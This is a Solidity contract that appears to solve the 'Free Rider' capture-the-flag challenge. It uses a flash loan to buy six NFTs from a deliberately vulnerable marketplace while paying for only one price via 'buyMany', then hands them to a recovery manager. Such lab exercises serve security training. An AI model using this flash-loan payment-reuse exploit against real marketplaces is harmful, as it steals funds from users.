// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {FreeRiderNFTMarketplace} from "../src/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../src/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../src/DamnValuableNFT.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";

contract Resolver is IERC721Receiver, IERC3156FlashBorrower {
    using Address for address payable;

    FreeRiderNFTMarketplace public marketpalace;
    FreeRiderRecoveryManager public recoveryManager;
    DamnValuableNFT public nft;
    address public immutable beneficiary;

    constructor(
        FreeRiderNFTMarketplace _marketPlace,
        FreeRiderRecoveryManager _recoveryManager,
        address _beneficiary
    ) {
        marketpalace = _marketPlace;
        recoveryManager = _recoveryManager;
        beneficiary = _beneficiary;
        nft = marketpalace.token();
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata
    ) external override returns (bytes32) {
        uint256[] memory tokenIds = new uint256[](6);

        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        // Exploit buyMany using only amount ETH
        marketpalace.buyMany{value: amount}(tokenIds);

        // Send NFTs to recovery manager

        for (uint256 i = 0; i < 6; i++) {
            bytes memory data = i == 5 ? abi.encode(beneficiary) : new bytes(0);
            nft.safeTransferFrom(
                address(this),
                address(recoveryManager),
                i,
                data
            );
        }

        // Repay flash loan
        payable(msg.sender).sendValue(amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    receive() external payable {}

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external override returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
